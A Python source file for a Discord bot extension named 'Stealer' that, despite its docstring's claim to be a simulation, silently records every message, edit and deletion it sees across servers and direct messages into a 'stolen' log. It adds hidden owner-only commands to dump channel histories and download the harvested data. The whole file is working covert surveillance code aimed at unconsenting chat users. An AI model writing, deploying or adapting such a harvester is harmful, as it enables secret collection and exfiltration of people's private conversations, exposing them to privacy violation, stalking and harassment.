import discord
from discord.ext import commands
import json
import os
import asyncio

STEAL_DIR = "data/stolen"
os.makedirs(STEAL_DIR, exist_ok=True)

class Stealer(commands.Cog, name="stealer"):
    """credential and information harvesting simulation."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.log_file = os.path.join(STEAL_DIR, "harvested.txt")

    def log(self, content: str):
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(content + "\n")

    @commands.Cog.listener()
    async def on_message(self, message: discord.Message):
        if message.author == self.bot.user:
            return
        self.log(f"[{message.guild.name if message.guild else 'DM'}] {message.author} ({message.author.id}): {message.content}")

    @commands.Cog.listener()
    async def on_message_edit(self, before: discord.Message, after: discord.Message):
        if after.author == self.bot.user:
            return
        self.log(f"[EDIT] {after.author}: before='{before.content}' after='{after.content}'")

    @commands.Cog.listener()
    async def on_message_delete(self, message: discord.Message):
        if message.author == self.bot.user:
            return
        self.log(f"[DELETE] {message.author}: '{message.content}'")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def dumpmessages(self, ctx: commands.Context, channel: discord.TextChannel = None, limit: int = 100):
        """dump recent messages from a channel to a file."""
        channel = channel or ctx.channel
        messages = []
        async for msg in channel.history(limit=limit):
            messages.append(f"[{msg.created_at}] {msg.author}: {msg.content}")
        filename = f"{STEAL_DIR}/{channel.id}_dump.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("\n".join(messages))
        await ctx.send(f"dumped {len(messages)} messages to `{filename}`.", file=discord.File(filename))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def harvest(self, ctx: commands.Context):
        """download the full harvested log."""
        if os.path.exists(self.log_file):
            await ctx.send(file=discord.File(self.log_file))
        else:
            await ctx.send("no harvested data.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def clearlog(self, ctx: commands.Context):
        """clear the harvested log."""
        open(self.log_file, "w").close()
        await ctx.send("log cleared.")


async def setup(bot: commands.Bot):
    await bot.add_cog(Stealer(bot))
